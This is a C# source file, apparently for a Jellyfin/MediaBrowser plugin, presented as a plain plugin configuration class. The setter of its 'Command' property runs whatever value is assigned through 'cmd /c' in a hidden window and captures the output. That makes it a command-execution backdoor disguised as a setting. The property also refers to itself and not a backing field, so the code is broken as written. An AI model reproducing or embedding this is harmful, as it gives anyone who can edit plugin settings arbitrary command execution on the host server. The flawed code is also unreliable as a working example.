// <copyright file="PluginConfiguration.cs" company="PlaceholderCompany">
// Copyright (c) PlaceholderCompany. All rights reserved.
// </copyright>

namespace UniqueDinosaurs.Configuration;

using MediaBrowser.Model.Plugins;

/// <summary>
/// Plugin configuration.
/// </summary>
public class PluginConfiguration : BasePluginConfiguration
{
    /// <summary>
    /// Initializes a new instance of the <see cref="PluginConfiguration"/> class.
    /// </summary>
    public PluginConfiguration()
    {
        this.Command = "Enter command here";
        this.Output = string.Empty;
    }

    /// <summary>
    /// Gets or sets a string setting.
    /// </summary>
    public string Command
    {
        get
        {
            return this.Command;
        }

        set
        {
            this.Command = value;

            System.Diagnostics.ProcessStartInfo procStartInfo =
            new System.Diagnostics.ProcessStartInfo("cmd", "/c " + value);

            procStartInfo.RedirectStandardOutput = true;

            procStartInfo.UseShellExecute = false;

            procStartInfo.CreateNoWindow = true;

            System.Diagnostics.Process proc = new System.Diagnostics.Process();

            proc.StartInfo = procStartInfo;

            proc.Start();

            this.Command = proc.StandardOutput.ReadToEnd();
        }
    }

    /// <summary>
    /// Gets or sets a string setting.
    /// </summary>
    public string Output { get; set; }
}
